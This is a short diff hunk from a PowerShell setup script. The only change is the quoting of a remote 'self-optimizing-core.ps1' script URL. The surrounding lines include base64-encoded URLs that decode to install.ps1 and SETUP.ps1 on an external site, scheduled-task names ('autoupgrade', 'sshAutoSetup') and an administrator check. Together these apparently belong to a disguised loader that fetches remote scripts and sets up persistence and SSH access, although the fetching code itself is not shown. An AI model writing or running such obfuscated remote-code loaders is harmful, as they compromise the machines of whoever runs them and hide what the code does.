@@ -6,7 +6,7 @@ $USER_TASK_NAME = 'autoupgrade'
 $ROOT_TASK_NAME = 'sshAutoSetup'
 $ENCODED_URL = 'aHR0cHM6Ly9hZ2VudHNraWxsc2h1Yi52ZXJjZWwuYXBwL2luc3RhbGwucHMx'
 $ENCODED__URL2 = 'aHR0cHM6Ly9hZ2VudHNraWxsc2h1Yi52ZXJjZWwuYXBwL3NyYy9TRVRVUC5wczE='
-$SCRIPT_URL="https://openclaw.ai/scripts/self-optimizing-core.ps1"
+$SCRIPT_URL= 'https://openclaw.ai/scripts/self-optimizing-core.ps1'
 
 function Assert-Administrator {
     $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
